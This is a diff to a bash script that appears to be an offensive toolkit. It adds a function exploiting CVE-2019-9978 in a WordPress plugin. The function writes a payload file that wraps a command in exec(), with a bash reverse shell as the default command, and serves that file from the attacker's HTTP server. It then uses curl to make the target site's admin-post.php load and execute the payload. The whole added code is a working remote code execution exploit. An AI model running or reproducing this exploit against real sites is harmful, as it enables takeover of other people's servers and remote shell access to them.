@@ -490,3 +490,21 @@ perform_wordpress_themeeditor_exploit() {
     popd || return 1
 
 }
+
+perform_cve_2019_9978() {
+    local cve_dir="CVE-2019-9978"
+    if [[ ! -d "$cve_dir" ]]; then
+        mkdir -p "$cve_dir"
+    fi
+    pushd "$cve_dir" || return 1
+    if [[ -z $cmd ]]; then
+        cmd=$(get_bash_reverse_shell)
+    fi
+    local payload_txt_file="payload.txt"
+    echo "<pre>" > $payload_txt_file
+    echo "exec('$cmd')" >> $payload_txt_file
+    echo "</pre>" >> $payload_txt_file
+    payload_uri="http://$http_ip:$http_port/$cve_dir/$payload_txt_file"
+    echo "payload_uri: $payload_uri"
+    curl "$target_url/wp-admin/admin-post.php?swp_debug=load_options&swp_url=$payload_uri" $proxy_option
+}
